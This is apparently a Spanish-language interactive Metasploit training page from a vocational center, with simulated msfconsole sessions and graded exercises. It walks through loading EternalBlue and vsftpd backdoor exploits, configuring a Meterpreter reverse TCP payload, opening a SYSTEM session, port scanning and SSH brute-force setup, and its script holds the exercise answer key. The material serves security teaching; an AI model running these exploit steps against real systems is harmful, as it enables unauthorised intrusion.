<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guía Interactiva Metasploit Intermedio</title>
    <style>
        body {
            font-family: sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            color: #333;
        }

        header {
            display: flex;
            align-items: center;
            background-color: #003366; /* Color institucional similar al azul del logo */
            color: white;
            padding: 10px 20px;
            margin-bottom: 20px;
        }

        header img {
            height: 50px; /* Ajusta la altura del logo */
            margin-right: 15px;
        }

        header span {
            font-size: 1.5em;
            font-weight: bold;
        }

        .guide-container {
            max-width: 900px;
            margin: 0 auto;
            padding: 0 20px;
        }

        .step {
            background-color: #fff;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            display: none; /* Hidden by default */
        }

        .step.active {
            display: block; /* Show active step */
        }

        h2, h3 {
            color: #0056b3; /* Azul para títulos */
        }

        .demo {
            background-color: #f8f8f8;
            border: 1px solid #ddd;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
            overflow-x: auto; /* Enable horizontal scroll if content is too wide */
        }

        .demo pre {
            margin: 0;
            white-space: pre-wrap; /* Wrap long lines */
            word-wrap: break-word;
        }

        .exercise {
            background-color: #e9f7ef; /* Verde claro */
            border: 1px solid #d0e9c6;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }

        .exercise input[type="text"] {
            width: calc(100% - 22px); /* Adjust width considering padding/border */
            padding: 10px;
            margin-right: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box; /* Include padding and border in element's total width and height */
        }
         .exercise textarea {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            resize: vertical; /* Allow vertical resize */
             min-height: 60px;
        }

        .exercise button {
            padding: 10px 15px;
            background-color: #007bff; /* Azul para botones */
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .exercise button:hover {
            background-color: #0056b3;
        }
         .exercise button:disabled {
             background-color: #cccccc;
             cursor: not-allowed;
         }


        .feedback {
            margin-top: 10px;
            padding: 10px;
            border-radius: 4px;
            display: none; /* Hidden by default */
        }

        .feedback.correct {
            background-color: #d4edda; /* Verde suave */
            color: #155724; /* Verde oscuro */
            border-color: #c3e6cb;
            display: block;
        }

        .feedback.incorrect {
            background-color: #f8d7da; /* Rojo suave */
            color: #721c24; /* Rojo oscuro */
            border-color: #f5c6cb;
            display: block;
        }

        .navigation {
            text-align: center;
            margin-top: 20px;
            margin-bottom: 40px; /* Espacio al final */
        }

        .navigation button {
            padding: 10px 20px;
            margin: 0 10px;
            background-color: #6c757d; /* Gris para navegación */
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .navigation button:hover:not(:disabled) {
            background-color: #5a6268;
        }

        .navigation button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }

         .step-indicator {
             margin: 0 15px;
             font-weight: bold;
         }
    </style>
</head>
<body>

    <header>
        <img src="https://i.postimg.cc/mZzx20wW/Logosimbolo-SENA-PRINCIPAL.png" alt="Logo SENA">
        <span>Centro de Servicios y Gestión Empresarial</span>
    </header>

    <div class="guide-container">

        <div class="step active" id="step-1">
            <h2>Paso 1: Introducción y Estructura Básica de msfconsole (Repaso)</h2>
            <p>
                ¡Bienvenido a la guía interactiva de Metasploit de nivel intermedio! Asumimos que ya conoces los fundamentos de la línea de comandos y la jerarquía básica de Metasploit (módulos, msfconsole). En este nivel, nos centraremos en el uso efectivo de exploits, payloads y técnicas de post-explotación básicas.
            </p>
            <p>
                La interfaz principal de Metasploit es <code>msfconsole</code>. Aquí es donde cargarás módulos, establecerás opciones y ejecutarás ataques. La estructura de los módulos es clave:
            </p>
            <ul>
                <li><strong>Exploits:</strong> Módulos que aprovechan vulnerabilidades para obtener acceso.</li>
                <li><strong>Payloads:</strong> El código que se ejecuta en el objetivo después de un exploit exitoso (ej. shell, Meterpreter).</li>
                <li><strong>Auxiliary:</strong> Módulos para escaneo, fuzzing, recolección de información, etc. (no obtienen shell directamente).</li>
                <li><strong>Post:</strong> Módulos que se ejecutan después de haber obtenido acceso.</li>
                <li><strong>Encoders:</strong> Para ofuscar payloads.</li>
                <li><strong>NOPs:</strong> No Operation instructions, a menudo usadas para evitar que los payloads fallen.</li>
            </ul>
             <p>El comando <code>help</code> dentro de msfconsole te mostrará todos los comandos disponibles.</p>

            <h3>Demostración Visual (Simulación de Terminal):</h3>
            <div class="demo">
                <pre>
msfconsole -q
##        .'
##       / /
##      / /__
##     / /___`.
##    / / ____`.
##   / / / $. `\
##  / /_/ / $.. `\
## /_______/ $... `\
## \________/ $$... `\
##  \______/ $.$... `\
##    \____/ $$$$... `\
##     \__/ $$$$$... `\
##
##
##       Metasploit Framework
##
##  --[ Version: 6.x.x
##  --[ &lt;3: https://metasploit.com
##
##
## msf6 > help

Core Commands
=============

    Command       Description
    --------      -----------
    ?             Alias for help
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    ... (much more help output) ...

Module Commands
===============

    Command       Description
    --------      -----------
    back          Move back to the previous context
    info          Displays information about a module
    options       Displays options for the current module
    payloads      List available payloads for the current exploit
    run           Alias for exploit
    search        Searches module names and descriptions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    show          Displays modules of a given type, or all modules
    unset         Unsets a context-specific variable
    unsetg        Unsets a global variable
    use           Selects a module by name

... (other sections like Job Commands, Resource Script Commands, etc.) ...

msf6 ></pre>
            </div>

            <h3>Ejercicio Práctico:</h3>
            <p>Dentro de <code>msfconsole</code>, uno de los primeros pasos es a menudo buscar módulos relevantes. ¿Cuál es el comando para buscar módulos, por ejemplo, todos los exploits?</p>
            <div class="exercise">
                <p>Escribe el comando que usarías en msfconsole para buscar específicamente módulos de tipo 'exploit'.</p>
                <input type="text" id="exercise1-input" placeholder="Tu comando aquí">
                <button class="check-exercise" data-step="1">Verificar</button>
                <div class="feedback" id="exercise1-feedback"></div>
            </div>
        </div>

        <div class="step" id="step-2">
            <h2>Paso 2: Encontrando y Seleccionando Exploits</h2>
            <p>
                El comando <code>search</code> es fundamental para encontrar los módulos que necesitas. Puedes buscar por nombre, descripción, tipo (exploit, auxiliary, etc.), plataforma (windows, linux), fecha, CVE, etc. Combinar criterios de búsqueda te ayuda a refinar los resultados.
            </p>
            <p>
                Una vez que encuentres un exploit potencial, usas el comando <code>use</code> seguido de la ruta del módulo para cargarlo. Esto cambia tu contexto dentro de <code>msfconsole</code> al módulo seleccionado.
            </p>

            <h3>Demostración Visual (Simulación de Terminal):</h3>
            <div class="demo">
                <pre>
msf6 > search type:exploit platform:windows ms17-010

Matching Modules
================

#  Name                                        Disclosure Date  Rank    Check  Description
-- ----                                        ---------------  ----    -----  -----------
0  exploit/windows/smb/ms17_010_eternalblue    2017-04-11       average yes    Microsoft SMB V1 Remote Code Execution Vulnerability (EternalBlue)
1  exploit/windows/smb/ms17_010_psexec         2017-04-11       excellent yes    Microsoft SMB V1 Remote Code Execution Attempt
2  exploit/windows/smb/ms17_010_eternalromance 2017-04-11       average yes    Microsoft SMB V1 Remote Code Execution Vulnerability (EternalRomance)
3  exploit/windows/smb/ms17_010_grouppolicy    2017-04-11       manual  no     Microsoft SMB V1 Group Policy Script Execution

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) ></pre>
            </div>

            <h3>Ejercicio Práctico:</h3>
            <p>Encuentra un exploit y cárgalo. Imagina que has identificado que un objetivo es vulnerable a VSFTPD versión 2.3.4. Necesitas cargar el exploit correspondiente en msfconsole.</p>
            <div class="exercise">
                <p>Escribe el comando exacto que usarías en msfconsole para cargar el módulo exploit para VSFTPD 2.3.4 (la ruta del módulo es típicamente <code>exploit/unix/ftp/vsftpd_234_backdoor</code>).</p>
                <input type="text" id="exercise2-input" placeholder="Tu comando aquí">
                <button class="check-exercise" data-step="2">Verificar</button>
                <div class="feedback" id="exercise2-feedback"></div>
            </div>
        </div>

        <div class="step" id="step-3">
            <h2>Paso 3: Configurando Opciones del Exploit</h2>
            <p>
                Una vez que has cargado un exploit, el siguiente paso crucial es configurar sus opciones. Cada exploit tiene un conjunto de opciones requeridas y opcionales. El comando <code>show options</code> te muestra estas opciones y sus valores actuales.
            </p>
            <p>
                Las opciones más comunes son:
            </p>
            <ul>
                <li><code>RHOSTS</code>: La dirección IP o rango de direcciones IP del objetivo(s) remoto(s).</li>
                <li><code>RPORT</code>: El puerto remoto del servicio vulnerable.</li>
                <li><code>LHOST</code>: Tu dirección IP local (para payloads que requieren conexión de vuelta).</li>
                <li><code>LPORT</code>: El puerto local en el que Metasploit escuchará la conexión de vuelta (para payloads que requieren conexión de vuelta).</li>
            </ul>
            <p>
                Usas el comando <code>set</code> para establecer el valor de una opción específica. Usa <code>setg</code> para establecer una opción global que se aplique a futuros módulos cargados. Usa <code>unset</code> o <code>unsetg</code> para eliminar un valor.
            </p>

            <h3>Demostración Visual (Simulación de Terminal):</h3>
            <div class="demo">
                <pre>
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   AllowPowerShellDowngrade  false            no        Allow Powershell downgrade if needed (required for some payloads)
   exploit.targets        0                  no        The target to exploit
   RHOSTS                            yes       The target host(s), range CIDR identifiers, or hosts file with syntax 'file:name'
   RPORT          445              yes       The target port (TCP)
   SMBPIPE        browser          no        The pipe name to use (e.g. browser, srvsvc)

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.150
RHOSTS => 192.168.1.150
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   AllowPowerShellDowngrade  false            no        Allow Powershell downgrade if needed (required for some payloads)
   exploit.targets        0                  no        The target to exploit
   RHOSTS         192.168.1.150    yes       The target host(s), range CIDR identifiers, or hosts file with syntax 'file:name'
   RPORT          445              yes       The target port (TCP)
   SMBPIPE        browser          no        The pipe name to use (e.g. browser, srvsvc)

msf6 exploit(windows/smb/ms17_010_eternalblue) ></pre>
            </div>

            <h3>Ejercicio Práctico:</h3>
            <p>Estás configurando un exploit. Ya has cargado el módulo. Ahora necesitas indicarle a Metasploit la dirección IP de la máquina objetivo. Supongamos que la IP es <code>10.10.10.20</code>.</p>
            <div class="exercise">
                <p>Escribe el comando exacto que usarías en msfconsole para establecer la dirección IP objetivo <code>10.10.10.20</code>.</p>
                <input type="text" id="exercise3-input" placeholder="Tu comando aquí">
                <button class="check-exercise" data-step="3">Verificar</button>
                <div class="feedback" id="exercise3-feedback"></div>
            </div>
        </div>

        <div class="step" id="step-4">
            <h2>Paso 4: Seleccionando y Configurando el Payload</h2>
            <p>
                El payload es el código que se ejecuta en la máquina objetivo si el exploit tiene éxito. Metasploit ofrece una gran variedad de payloads, desde shells de comandos simples hasta el avanzado Meterpreter.
            </p>
            <p>
                El comando <code>show payloads</code> (usado dentro de un módulo exploit) listará los payloads compatibles con ese exploit. Usas el comando <code>set PAYLOAD</code> seguido del nombre del payload para seleccionarlo.
            </p>
            <p>
                Una vez que has seleccionado un payload, a menudo necesitarás configurarlo también. Por ejemplo, los payloads de tipo reverse (que se conectan de vuelta a ti) requieren que establezcas <code>LHOST</code> (tu IP) y <code>LPORT</code> (el puerto donde Metasploit escuchará). Usa <code>show options</code> de nuevo para ver las opciones del payload seleccionado.
            </p>

            <h3>Demostración Visual (Simulación de Terminal):</h3>
            <div class="demo">
                <pre>
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

    #   Name                                          Disclosure Date  Rank    Check  Description
    --  ----                                          ---------------  ----    -----  -----------
    0   generic/shell_bind_tcp                                         normal  no     Listen for and spawn a command shell (bind)
    1   generic/shell_reverse_tcp                                      normal  no     Connect back to attacker and spawn a command shell (reverse)
    ... (many other payloads) ...
    10  windows/meterpreter/bind_tcp                                   normal  no     Inject the Meterpreter server DLL (staged). Listen for a connection (bind)
    11  windows/meterpreter/reverse_tcp                                normal  no     Inject the Meterpreter server DLL (staged). Connect back to the attacker (reverse)
    ... (more) ...

msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   AllowPowerShellDowngrade  false            no        Allow Powershell downgrade if needed (required for some payloads)
   exploit.targets        0                  no        The target to exploit
   RHOSTS         192.168.1.150    yes       The target host(s), range CIDR identifiers, or hosts file with syntax 'file:name'
   RPORT          445              yes       The target port (TCP)
   SMBPIPE        browser          no        The pipe name to use (e.g. browser, srvsvc)

Payload options (windows/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (attr: local_host)
   LPORT  4444             yes       The listen port (attr: local_port)

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100
LHOST => 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 443
LPORT => 443
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options ... (same as above) ...

Payload options (windows/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.100    yes       The listen address (attr: local_host)
   LPORT  443              yes       The listen port (attr: local_port)

msf6 exploit(windows/smb/ms17_010_eternalblue) ></pre>
            </div>

            <h3>Ejercicio Práctico:</h3>
            <p>Has seleccionado un exploit y necesitas configurar el payload. Decides usar un payload Meterpreter de tipo reverse TCP para Windows (la ruta es <code>windows/meterpreter/reverse_tcp</code>). Tu dirección IP local es <code>172.16.0.50</code> y quieres que Metasploit escuche en el puerto <code>8443</code>.</p>
            <div class="exercise">
                <p>Escribe los comandos (separados por un punto y coma <code>;</code> si son más de uno) que usarías para: 1) Establecer el payload <code>windows/meterpreter/reverse_tcp</code>, 2) Establecer tu LHOST a <code>172.16.0.50</code>, y 3) Establecer tu LPORT a <code>8443</code>.</p>
                <textarea id="exercise4-input" placeholder="Comando1; Comando2; Comando3"></textarea>
                <button class="check-exercise" data-step="4">Verificar</button>
                <div class="feedback" id="exercise4-feedback"></div>
            </div>
        </div>

        <div class="step" id="step-5">
            <h2>Paso 5: Ejecutando el Exploit</h2>
            <p>
                Una vez que has cargado el exploit, seleccionado el payload y configurado todas las opciones requeridas (verifica con <code>show options</code>), estás listo para ejecutar el ataque.
            </p>
            <p>
                Los comandos para ejecutar un exploit son <code>exploit</code> o su alias <code>run</code>. Si usas un payload que requiere un listener (como los reverse TCP), Metasploit iniciará automáticamente un handler (un listener) para recibir la conexión entrante del objetivo.
            </p>
            <p>
                Después de ejecutar el comando, Metasploit intentará aprovechar la vulnerabilidad. Si tiene éxito, recibirás una sesión (Meterpreter, shell, etc.). Si falla, verás un mensaje indicando la razón del fallo.
            </p>

            <h3>Demostración Visual (Simulación de Terminal):</h3>
            <div class="demo">
                <pre>
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
... (Verify all required options are set) ...

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.100:443
[*] 192.168.1.150:445 - Connecting to target for exploitation.
[*] 192.168.1.150:445 - Connection established for exploitation.
[*] 192.168.1.150:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 192.168.1.150:445 - Attempting to trigger vulnerability...
[*] 192.168.1.150:445 - Sending stage (175174 bytes) to 192.168.1.150
[*] Meterpreter session 1 opened (192.168.1.100:443 -> 192.168.1.150:50123) at 2023-10-27 10:30:45 -0500
msf6 exploit(windows/smb/ms17_010_eternalblue) > </pre>
            </div>
            <p>
                En la demostración, se muestra que Metasploit inicia el handler, se conecta al objetivo, envía el payload (stage) y, finalmente, se abre una sesión Meterpreter (<code>session 1 opened</code>).
            </p>

            <h3>Ejercicio Práctico:</h3>
            <p>Has configurado completamente un exploit y su payload. Estás listo para lanzar el ataque.</p>
            <div class="exercise">
                <p>Escribe el comando que usarías en msfconsole para ejecutar el exploit actual.</p>
                <input type="text" id="exercise5-input" placeholder="Tu comando aquí">
                <button class="check-exercise" data-step="5">Verificar</button>
                <div class="feedback" id="exercise5-feedback"></div>
            </div>
        </div>

        <div class="step" id="step-6">
            <h2>Paso 6: Interacción con la Sesión (Introducción a Meterpreter)</h2>
            <p>
                Si el exploit es exitoso y el payload se ejecuta, obtendrás una "sesión". El tipo de sesión depende del payload. La más común y potente es la sesión Meterpreter.
            </p>
            <p>
                Meterpreter es un payload avanzado que se ejecuta completamente en memoria y proporciona un rico conjunto de comandos para interactuar con el sistema comprometido sin tocar el disco, lo que lo hace más sigiloso.
            </p>
            <p>
                Cuando obtienes una sesión, Metasploit te devuelve al prompt principal (<code>msf6 ></code>). Puedes interactuar con la sesión usando el comando <code>sessions</code>.
            </p>
            <ul>
                <li><code>sessions -l</code>: Lista las sesiones activas.</li>
                <li><code>sessions -i [ID]</code>: Interactúa con una sesión específica por su ID.</li>
            </ul>
            <p>
                Dentro de una sesión Meterpreter, tienes tus propios comandos. Puedes verlos con <code>help</code>. Algunos comandos básicos incluyen:
            </p>
            <ul>
                <li><code>sysinfo</code>: Muestra información del sistema.</li>
                <li><code>getuid</code>: Muestra el usuario bajo el que se está ejecutando Meterpreter.</li>
                <li><code>pwd</code>: Directorio de trabajo actual (en el objetivo).</li>
                <li><code>ls</code>: Listar archivos y directorios.</li>
                <li><code>upload [archivo_local] [archivo_remoto]</code>: Subir un archivo al objetivo.</li>
                <li><code>download [archivo_remoto] [archivo_local]</code>: Descargar un archivo del objetivo.</li>
                <li><code>shell</code>: Abrir un shell de comandos nativo (cmd.exe, bash, etc.).</li>
                <li><code>background</code>: Pone la sesión en segundo plano para volver a msfconsole.</li>
                <li><code>exit</code>: Termina la sesión.</li>
            </ul>


            <h3>Demostración Visual (Simulación de Terminal):</h3>
            <div class="demo">
                <pre>
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information                      Connection
  --  ----  ----                   -----------                      ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ VICTIM-PC  192.168.1.100:443 -> 192.168.1.150:50123 (192.168.1.150)

msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer    : VICTIM-PC
OS          : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture: x64
BuildStamp  : 7601.win7sp1_ldr.161011-0600
...
Meterpreter : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) ></pre>
            </div>

            <h3>Ejercicio Práctico:</h3>
            <p>Has obtenido una sesión Meterpreter con ID 2 después de un exploit exitoso. Quieres interactuar con ella para obtener información del sistema del objetivo.</p>
            <div class="exercise">
                <p>Escribe los comandos (separados por un punto y coma <code>;</code>) que usarías para: 1) Entrar en la sesión Meterpreter con ID 2, y 2) Una vez dentro de Meterpreter, obtener la información del sistema.</p>
                 <textarea id="exercise6-input" placeholder="Comando1; Comando2"></textarea>
                <button class="check-exercise" data-step="6">Verificar</button>
                <div class="feedback" id="exercise6-feedback"></div>
            </div>
        </div>

         <div class="step" id="step-7">
            <h2>Paso 7: Uso de Módulos Auxiliary (Ejemplo: Escaneo)</h2>
            <p>
                Los módulos Auxiliary son herramientas muy útiles para la fase de reconocimiento o post-explotación. No están diseñados para obtener una sesión, sino para recopilar información, escanear puertos, realizar ataques de fuerza bruta, etc.
            </p>
            <p>
                La forma de usar los módulos auxiliary es muy similar a los exploits:
            </p>
            <ul>
                <li><code>search type:auxiliary [término]</code>: Para encontrar módulos auxiliary.</li>
                <li><code>use [ruta_del_módulo]</code>: Para cargar el módulo.</li>
                <li><code>show options</code>: Para ver las opciones (muchos auxiliary requieren <code>RHOSTS</code> o <code>RPORT</code>).</li>
                <li><code>set [opción] [valor]</code>: Para configurar las opciones.</li>
                <li><code>run</code> o <code>exploit</code>: Para ejecutar el módulo (aunque no sea un exploit, se usa el mismo comando).</li>
            </ul>
            <p>
                Un ejemplo común es el escaneo de puertos. Metasploit tiene varios módulos auxiliary para esto, como <code>auxiliary/scanner/portscan/tcp</code>.
            </p>

            <h3>Demostración Visual (Simulación de Terminal):</h3>
            <div class="demo">
                <pre>
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   BATCHSIZE    250              yes       The number of hosts to probe in each set
   PORTS        1-10000          yes       Ports to scan (e.g. 22,T:23-25,80,110-120,139,445,1433,1500,3306,5432,5900,8000,8080)
   RHOSTS                        yes       The target host(s), range CIDR identifiers, or hosts file with syntax 'file:name'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The number of seconds to wait for a response

msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.1/24
RHOSTS => 192.168.1.1/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 21,22,80,443,445,3389
PORTS => 21,22,80,443,445,3389
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 20
THREADS => 20
msf6 auxiliary(scanner/portscan/tcp) > run

[*] Command: services -p 21,22,80,443,445,3389 -R 192.168.1.1/24
...
[*] 192.168.1.100: TCP OPEN (80)
[*] 192.168.1.100: TCP OPEN (445)
[*] 192.168.1.150: TCP OPEN (445)
[*] 192.168.1.1: TCP OPEN (80)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > </pre>
            </div>
            <p>
                Este módulo es útil para identificar rápidamente qué puertos comunes están abiertos en una red o en hosts específicos. La sintaxis de los puertos permite rangos y listas separadas por comas.
            </p>

            <h3>Ejercicio Práctico:</h3>
            <p>Quieres usar el módulo <code>auxiliary/scanner/ssh/ssh_login</code> para intentar adivinar credenciales SSH en una máquina específica. La IP objetivo es <code>192.168.1.200</code>.</p>
            <div class="exercise">
                <p>Escribe los comandos (separados por un punto y coma <code>;</code>) que usarías para: 1) Cargar el módulo <code>auxiliary/scanner/ssh/ssh_login</code>, y 2) Establecer la dirección IP objetivo a <code>192.168.1.200</code>.</p>
                 <textarea id="exercise7-input" placeholder="Comando1; Comando2"></textarea>
                <button class="check-exercise" data-step="7">Verificar</button>
                <div class="feedback" id="exercise7-feedback"></div>
            </div>
        </div>

         <div class="step" id="step-8">
            <h2>Paso 8: Conclusión y Siguientes Pasos</h2>
            <p>
                Has completado la guía básica de Metasploit a nivel intermedio. Ahora deberías sentirte cómodo buscando, seleccionando, configurando y ejecutando exploits y módulos auxiliary básicos. También has visto cómo interactuar con sesiones, especialmente Meterpreter.
            </p>
            <p>
                Este es solo el comienzo. Para avanzar a un nivel más experto, considera explorar:
            </p>
            <ul>
                <li><strong>Post-Explotación:</strong> Módulos <code>post</code> de Metasploit (escalada de privilegios, movimiento lateral, recolección de datos).</li>
                <li><strong>Meterpreter Avanzado:</strong> Migración de procesos, uso de módulos de Meterpreter, persistencia.</li>
                <li><strong>Generación de Payloads con <code>msfvenom</code>:</strong> Creación de ejecutables o scripts maliciosos personalizados.</li>
                <li><strong>Evasión de Antivirus/IDS:</strong> Técnicas para hacer que los payloads no sean detectados.</li>
                <li><strong>Uso de Base de Datos (db_status, nmap, services):</strong> Integrar resultados de escaneos y guardar información.</li>
                <li><strong>Escribir tus propios módulos:</strong> Si te interesa el desarrollo.</li>
            </ul>
            <p>
                La práctica constante en entornos de laboratorio seguros (como máquinas virtuales vulnerables: Metasploitable, Kioptrix, etc.) es clave para dominar Metasploit.
            </p>

            <h3>¡Felicidades por completar la guía!</h3>
            <p>Esperamos que esta guía interactiva te haya sido útil para solidificar tus conocimientos de Metasploit a nivel intermedio.</p>

            <div class="exercise">
                 <p>Como último paso, ¿cuál comando usarías en msfconsole para ver una lista de todos los módulos disponibles?</p>
                <input type="text" id="exercise8-input" placeholder="Tu comando aquí">
                <button class="check-exercise" data-step="8">Verificar</button>
                <div class="feedback" id="exercise8-feedback"></div>
            </div>
        </div>


        <div class="navigation">
            <button id="prev-step" disabled>Anterior</button>
            <span class="step-indicator">Paso 1 de 8</span>
            <button id="next-step">Siguiente</button>
        </div>

    </div> <!-- /guide-container -->

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const steps = document.querySelectorAll('.step');
            const prevBtn = document.getElementById('prev-step');
            const nextBtn = document.getElementById('next-step');
            const stepIndicator = document.querySelector('.step-indicator');
            const checkButtons = document.querySelectorAll('.check-exercise');

            let currentStepIndex = 0;
            const totalSteps = steps.length;

            function showStep(index) {
                steps.forEach((step, i) => {
                    if (i === index) {
                        step.classList.add('active');
                        step.scrollIntoView({ behavior: 'smooth', block: 'start' }); // Scroll to the step
                    } else {
                        step.classList.remove('active');
                    }
                });

                currentStepIndex = index;
                updateNavigation();
                updateStepIndicator();
            }

            function updateNavigation() {
                prevBtn.disabled = currentStepIndex === 0;
                nextBtn.disabled = currentStepIndex === totalSteps - 1;
            }

            function updateStepIndicator() {
                stepIndicator.textContent = `Paso ${currentStepIndex + 1} de ${totalSteps}`;
            }

            function checkExercise(stepNumber) {
                const input = document.getElementById(`exercise${stepNumber}-input`);
                const feedbackDiv = document.getElementById(`exercise${stepNumber}-feedback`);
                let userAnswer = input.value.trim();
                let correctAnswer = ''; // Expected answer(s)
                let isCorrect = false;

                feedbackDiv.classList.remove('correct', 'incorrect');
                feedbackDiv.style.display = 'none'; // Hide before showing new feedback

                 // Normalize input for case-insensitive comparison and handle multiple commands
                 userAnswer = userAnswer.toLowerCase().replace(/\s+/g, ' ').trim();


                switch (stepNumber) {
                    case 1:
                        // search type:exploit
                        correctAnswer = 'search type:exploit';
                        isCorrect = userAnswer.includes('search') && userAnswer.includes('type:exploit');
                         if (!isCorrect && (userAnswer.includes('show') && userAnswer.includes('exploits'))) {
                             isCorrect = true; // Also accept 'show exploits' as it's very similar intention
                         }
                        break;
                    case 2:
                        // use exploit/unix/ftp/vsftpd_234_backdoor
                        correctAnswer = 'use exploit/unix/ftp/vsftpd_234_backdoor';
                        isCorrect = userAnswer === correctAnswer;
                        break;
                    case 3:
                        // set RHOSTS 10.10.10.20
                        correctAnswer = 'set rhosts 10.10.10.20';
                        // Check if it starts with set rhosts and ends with the correct IP
                        isCorrect = userAnswer.startsWith('set rhosts ') && userAnswer.endsWith('10.10.10.20');
                         // Also accept set RHOST (singular)
                         if (!isCorrect && userAnswer.startsWith('set rhost ') && userAnswer.endsWith('10.10.10.20')) {
                             isCorrect = true;
                             correctAnswer = 'set RHOST/RHOSTS 10.10.10.20'; // Update feedback message
                         }

                        break;
                    case 4:
                        // set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 172.16.0.50; set LPORT 8443
                        // Split commands by semicolon and trim/normalize
                        let commands = userAnswer.split(';').map(cmd => cmd.trim().toLowerCase().replace(/\s+/g, ' ')).filter(cmd => cmd.length > 0);
                        const expectedCommands = [
                            'set payload windows/meterpreter/reverse_tcp',
                            'set lhost 172.16.0.50',
                            'set lport 8443'
                        ];

                        // Check if all expected commands are present in the user's input array
                         let correctCount = 0;
                         for (const expCmd of expectedCommands) {
                             if (commands.includes(expCmd)) {
                                 correctCount++;
                             }
                         }
                         isCorrect = correctCount === expectedCommands.length;
                        correctAnswer = expectedCommands.join('; '); // For feedback
                        break;
                     case 5:
                         // exploit or run
                         correctAnswer = 'exploit o run';
                         isCorrect = userAnswer === 'exploit' || userAnswer === 'run';
                         break;
                     case 6:
                         // sessions -i 2; sysinfo
                         let commands6 = userAnswer.split(';').map(cmd => cmd.trim().toLowerCase().replace(/\s+/g, ' ')).filter(cmd => cmd.length > 0);
                         const expectedCommands6 = [
                             'sessions -i 2',
                             'sysinfo'
                         ];
                         let correctCount6 = 0;
                         for (const expCmd of expectedCommands6) {
                             if (commands6.includes(expCmd)) {
                                 correctCount6++;
                             }
                         }
                         isCorrect = correctCount6 === expectedCommands6.length;
                         correctAnswer = expectedCommands6.join('; '); // For feedback
                         break;
                    case 7:
                         // use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.200
                         let commands7 = userAnswer.split(';').map(cmd => cmd.trim().toLowerCase().replace(/\s+/g, ' ')).filter(cmd => cmd.length > 0);
                          const expectedCommands7 = [
                             'use auxiliary/scanner/ssh/ssh_login',
                          ];
                         // RHOSTS check is slightly more flexible for different IPs/formats
                         let rhostsSetCorrectly = commands7.some(cmd => cmd.startsWith('set rhosts ') && cmd.endsWith('192.168.1.200'));
                         // Also accept RHOST
                         if (!rhostsSetCorrectly) {
                              rhostsSetCorrectly = commands7.some(cmd => cmd.startsWith('set rhost ') && cmd.endsWith('192.168.1.200'));
                         }


                         let useModuleCorrect = commands7.includes(expectedCommands7[0]);

                         isCorrect = useModuleCorrect && rhostsSetCorrectly && commands7.length >= 2; // Need at least use and set commands
                         correctAnswer = 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.200'; // For feedback
                         break;
                     case 8:
                         // show all or show modules
                         correctAnswer = 'show all o show modules';
